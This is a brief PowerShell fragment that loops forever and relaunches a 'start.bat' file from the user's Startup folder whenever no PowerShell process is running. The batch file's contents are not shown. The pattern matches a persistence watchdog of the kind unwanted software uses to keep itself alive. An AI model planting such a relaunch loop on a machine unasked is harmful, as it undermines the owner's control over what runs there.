     while ($true) {                  
         $Procs = Get-Process powershell -ErrorAction SilentlyContinue  
         if (($procs).Count -eq 0) { 
             Start-Sleep -Seconds (3 * 60)                  
             Start-Process '~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\start.bat'                     
         }
         Start-Sleep -Seconds 30 
     }
